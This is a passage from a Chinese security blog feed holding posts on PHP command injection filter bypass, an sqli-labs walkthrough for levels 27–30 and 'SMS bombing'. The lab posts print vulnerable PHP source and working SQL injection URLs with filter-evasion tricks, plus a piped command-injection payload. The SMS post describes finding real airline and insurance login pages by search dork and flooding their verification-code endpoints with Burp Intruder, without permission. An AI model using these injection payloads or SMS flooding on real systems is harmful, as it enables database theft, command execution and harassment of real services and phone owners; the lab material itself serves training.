src="https://s2.ax1x.com/2019/01/29/kQ5zCR.png" alt="kQ5zCR.png"></p><p><b>绕过过滤</b><br>一些程序员为了防止这种情况的发生，进行了一定的过滤</p><pre><code>&lt;html&gt;&lt;head&gt;    &lt;title&gt;命令注入测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;输入IP&lt;/p&gt;&lt;form method=&quot;GET&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;    IP:&lt;input name=&quot;host&quot; type=&quot;text&quot; required&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;    &lt;p id=&quot;demo&quot;&gt;我是结果&lt;/p&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpheader(&quot;Content-type: text/html;charset=utf-8&quot;);if(isset($_GET[&#39;host&#39;])){    $ud=$_GET[&#39;host&#39;];    $j=check($ud);    echo &quot;payload：$j&quot;;    echo &quot;&lt;br&gt;&quot;;    $zx=system(&quot;ping &quot;.$j);    echo $zx;    echo &quot;&lt;script&gt;document.getElementById(&#39;demo&#39;).innerText=$zx&lt;/script&gt;&quot;;}function check($v){    $black_list=array(&#39;;&#39;=&gt;&#39;&#39;,&#39;&amp;&#39;=&gt;&#39;&#39;);    $th=str_replace(array_keys($black_list),$black_list,$v); /*读取黑名单数组里面的key，替换为黑名单里面的值也就是空*/    return $th;}?&gt;</code></pre><p>&amp;和；被过滤掉了，那么我们用|代替</p><pre><code>127.0.0.1 | ipconfig</code></pre><p><img src="https://s2.ax1x.com/2019/01/29/kQLxcd.png" alt="kQLxcd.png"></p><p>过滤更严谨一点</p><pre><code>&lt;html&gt;&lt;head&gt;    &lt;title&gt;命令注入测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;输入IP&lt;/p&gt;&lt;form method=&quot;GET&quot; action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;    IP:&lt;input name=&quot;host&quot; type=&quot;text&quot; required&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;    &lt;p id=&quot;demo&quot;&gt;我是结果&lt;/p&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpheader(&quot;Content-type: text/html;charset=utf-8&quot;);if(isset($_GET[&#39;host&#39;])){    $ud=$_GET[&#39;host&#39;];    $j=check($ud);    echo &quot;payload：$j&quot;;    echo &quot;&lt;br&gt;&quot;;    $zx=system(&quot;ping &quot;.$j);    echo $zx;    echo &quot;&lt;script&gt;document.getElementById(&#39;demo&#39;).innerText=$zx&lt;/script&gt;&quot;;}function check($v){    $black_list=array(&#39;;&#39;=&gt;&#39;&#39;,&#39;&amp;&#39;=&gt;&#39;&#39;,&#39;||&#39;=&gt;&#39;&#39;,&#39;|&#39;=&gt;&#39;&#39;,&#39;)&#39;=&gt;&#39;&#39;,&#39;(&#39;=&gt;&#39;&#39;);    $th=str_replace(array_keys($black_list),$black_list,$v); /*读取黑名单数组里面的key，替换为黑名单里面的值也就是空*/    return $th;}?&gt;</code></pre><p>或许这样可以防御大部分攻击，但是并不能完全保证不会被FUZZ绕过，而且未来说不定也会有办法什么之类的。<br>防御方案有两个：</p><pre><code>1.在获取用户输入后，用正则匹配出要进行命令执行的2.加入token机制，表单限制为只能输入数字</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs Less 27 -&gt; sqli-labs Less 30</title>
      <link href="/posts/178a3f65.html"/>
      <url>/posts/178a3f65.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天从sqli-labs第27关撸到了30关，emmm。还真多<br><img src="https://m.chinawbk.com/images/hk/Webh_C_ykHFh_C_yF4SjUjebh_C_ybVH8_P_94Obxpg1fMg4buDb1xuMKObU4bODKOfx1h_C_yGWxJ.jpg" alt="Webh_C_ykHFh_C_yF4SjUjebh_C_ybVH8_P_94Obxpg1fMg4buDb1xuMKObU4bODKOfx1h_C_yGWxJ.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先先看代码：<br>27关代码</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-27 Trick with SELECT &amp; UNION&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);// take the variables if(isset($_GET[&#39;id&#39;])){    $id=$_GET[&#39;id&#39;];    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);    fclose($fp);    //fiddling with comments    $id= blacklist($id);    //echo &quot;&lt;br&gt;&quot;;    //echo $id;    //echo &quot;&lt;br&gt;&quot;;    $hint=$id;// connectivity     $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;              echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];          echo &quot;&lt;br&gt;&quot;;          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}function blacklist($id){$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --.$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #.$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);        //Strip out spaces.$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);        //Strip out union$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);        //Strip out select$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);        //Strip out UNION$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);        //Strip out SELECT$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);        //Strip out Union$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);        //Strip out selectreturn $id;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-27.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=&quot;../images/Less-27-1.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;?&gt;&lt;/font&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>union和select都过滤掉了，这里有两个办法可以绕过</p><pre><code>1.双写被过滤的2.用/**/切割关键字，由于/**/会被匹配到然后替换为空1 payload :ununionion%a0seselectlect2 payload:un/**/ion/**/se/**/lect</code></pre><p><a href="http://35.201.152.114:8000/Less-27/?id=1%27%a0and%a0updatexml(1,concat(0x7e,(sel/**/ect%a0user(" target="_blank" rel="noopener">Less-27 Trick with SELECT &amp; UNION</a>),0x7e),1)|%271)</p><p><img src="https://s2.ax1x.com/2019/01/28/kMa05d.png" alt="kMa05d.png"></p><p>第27a,代码如下：</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-27 Trick with SELECT &amp; UNION&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);// take the variables if(isset($_GET[&#39;id&#39;])){    $id=$_GET[&#39;id&#39;];    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);    fclose($fp);    //fiddling with comments    $id= blacklist($id);    //echo &quot;&lt;br&gt;&quot;;    //echo $id;    //echo &quot;&lt;br&gt;&quot;;    $hint=$id;    $id = &#39;&quot;&#39; .$id. &#39;&quot;&#39;;// connectivity     $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;              echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];          echo &quot;&lt;br&gt;&quot;;          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}function blacklist($id){$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --.$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #.$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);        //Strip out spaces.$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);        //Strip out union$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);        //Strip out select$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);        //Strip out UNION$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);        //Strip out SELECT$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);        //Strip out Union$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);        //Strip out Selectreturn $id;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-27a.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=&quot;../images/Less-27a-1.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;?&gt;&lt;/font&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>这关和27关一样，只不过把报错输出注释了，用盲注吧</p><pre><code>http://35.201.152.114:8000/Less-27a/?id=1%22%a0and%a0sleep(if((length(database())=8),1,4))|%221</code></pre><p><img src="https://s2.ax1x.com/2019/01/28/kMdCM6.md.png" alt="kMdCM6.md.png"></p><p>第28关代码如下：</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-28 Trick with SELECT &amp; UNION&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);// take the variables if(isset($_GET[&#39;id&#39;])){    $id=$_GET[&#39;id&#39;];    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);    fclose($fp);    //fiddling with comments    $id= blacklist($id);    //echo &quot;&lt;br&gt;&quot;;    //echo $id;    //echo &quot;&lt;br&gt;&quot;;    $hint=$id;// connectivity     $sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;              echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];          echo &quot;&lt;br&gt;&quot;;          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}function blacklist($id){$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);                //strip out /*$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);                //Strip out --.$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);                    //Strip out #.$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.//$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);                    //Strip out spaces.$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);        //Strip out UNION &amp; SELECT.return $id;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-28.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=&quot;../images/Less-28-1.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;?&gt;&lt;/font&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>这个好像是匹配union+select，就是union到select这个地方，绕过方式也一样用 /**/代替</p><pre><code>http://35.201.152.114:8000/Less-28/?id=0%27)%a0un/**/ion%a0sel/**/ect%a01,user(),3|(%271</code></pre><p><img src="https://s2.ax1x.com/2019/01/28/kMddyV.png" alt="kMddyV.png"></p><p>第28a关代码如下：</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-28a Trick with SELECT &amp; UNION&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);// take the variables if(isset($_GET[&#39;id&#39;])){    $id=$_GET[&#39;id&#39;];    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);    fclose($fp);    //fiddling with comments    $id= blacklist($id);    //echo &quot;&lt;br&gt;&quot;;    //echo $id;    //echo &quot;&lt;br&gt;&quot;;    $hint=$id;// connectivity     $sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;              echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];          echo &quot;&lt;br&gt;&quot;;          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}function blacklist($id){//$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);                //strip out /*//$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);                //Strip out --.//$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);                    //Strip out #.//$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.//$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);                    //Strip out spaces.//$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);        //Strip out spaces.return $id;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-28a.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=&quot;../images/Less-28a-1.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: Your Input is Filtered with following result: &quot;.$hint;?&gt;&lt;/font&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>这里把一些过滤去掉了，也就是说无法用/**/了= =，不过不慌</p><pre><code>他这里只剩下匹配union+select这里的union和select大小写绕过中间的空格用%a0代替http://35.201.152.114:8000/Less-28a/?id=0%27)%a0uNion%a0sELECT%a01,database(),3|(%271</code></pre><p><img src="https://s2.ax1x.com/2019/01/28/kMwZ0U.png" alt="kMwZ0U.png"></p><p>第29关代码如下：</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-29 Protection with WAF&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);//disable error reportingerror_reporting(0);// take the variables if(isset($_GET[&#39;id&#39;])){    $id=$_GET[&#39;id&#39;];    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);    fclose($fp);    $qs = $_SERVER[&#39;QUERY_STRING&#39;];    $hint=$qs;// connectivity     $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;              echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];          echo &quot;&lt;br&gt;&quot;;          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-29.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=&quot;../images/Less-29-1.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: The Query String you input is: &quot;.$hint;?&gt;&lt;/font&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>这关我搞不明白为什么没过滤= =。。。，直接带走</p><pre><code>http://35.201.152.114:8000/Less-29/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)|%271</code></pre><p><img src="https://s2.ax1x.com/2019/01/28/kM0VgI.md.png" alt="kM0VgI.md.png"></p><p>30关代码如下：</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-30&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);//disable error reportingerror_reporting(0);// take the variables if(isset($_GET[&#39;id&#39;])){    $id=$_GET[&#39;id&#39;];    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);    fclose($fp);    $qs = $_SERVER[&#39;QUERY_STRING&#39;];    $hint=$qs;    $id = &#39;&quot;&#39; .$id. &#39;&quot;&#39;;// connectivity     $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;              echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];          echo &quot;&lt;br&gt;&quot;;          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-30.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=&quot;../images/Less-30-1.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: The Query String you input is: &quot;.$hint;?&gt;&lt;/font&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>也是没过滤。。。。带走</p><pre><code>http://35.201.152.114:8000/Less-30/?id=0%22union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x7573657273%20limit%200,1%20--+</code></pre><p><img src="https://s2.ax1x.com/2019/01/28/kM0DPJ.md.png" alt="kM0DPJ.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SMS bombing</title>
      <link href="/posts/299eb776.html"/>
      <url>/posts/299eb776.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天早上，想挖一个逻辑漏洞来掌握一下技巧，就上google直接搜intext:获取验证码 inurl:/login，然后找到一个某航空的短信轰炸和某平安的<br><img src="https://game.manga-joho.com/wp-content/uploads/2018/06/Screenshot_20180624-194317-min-e1529837190130.jpg" alt="Screenshot_20180624-194317-min-e1529837190130.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>某平安</b><br><img src="https://s2.ax1x.com/2019/01/28/kKolWt.md.png" alt="kKolWt.md.png"><br>burp抓包<br><img src="https://s2.ax1x.com/2019/01/28/kKo8Qf.png" alt="kKo8Qf.png"><br>发送到Repeater尝试修改zoneCode里面的数值，发现没有规律。有些能够发送成功，有些失败<br>zoneCode:98<br><img src="https://s2.ax1x.com/2019/01/28/kKoUoj.md.png" alt="kKoUoj.md.png"></p><p>zoneCode:88<br><img src="https://s2.ax1x.com/2019/01/28/kKo0Wq.png" alt="kKo0Wq.png"></p><p>然后改为其他的有的又能发送成功，直接发送到intruder然后fuzz。<br><img src="https://s2.ax1x.com/2019/01/28/kKosyT.png" alt="kKosyT.png"></p><p>结果：<br><img src="https://s2.ax1x.com/2019/01/28/kKo2TJ.png" alt="kKo2TJ.png"></p><p><img src="https://s2.ax1x.com/2019/01/28/kKofYR.png" alt="kKofYR.png"></p><p><b>某航空</b><br><img src="https://s2.ax1x.com/2019/01/28/kKoHmD.png" alt="kKoHmD.png"></p><p>抓包后发送到Repeater,直接点击两次发送，居然两次都能成功。也就是没有效验或限制了，直接发送到intruder<br><img src="https://s2.ax1x.com/2019/01/28/kKTP0g.png" alt="kKTP0g.png"></p><p><img src="https://s2.ax1x.com/2019/01/28/kKTZpq.md.png" alt="kKTZpq.md.png"></p><p><img src="https://s2.ax1x.com/2019/01/28/kKTe10.png" alt="kKTe10.png"></p><p>手机截图，，，，嗯。。。实验到一半好像烂了充不进电，所以很抱歉= =<br><img src="https://ws1.sinaimg.cn/large/005GOaLIgy1fxycd6uqhhj3073073mx2.jpg" alt="005GOaLIgy1fxycd6uqhhj3073073mx2.jpg"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Chm fishing</title>
      <link href="/posts/5a94aee0.html"/>
      <url>/posts/5a94aee0.html</url>
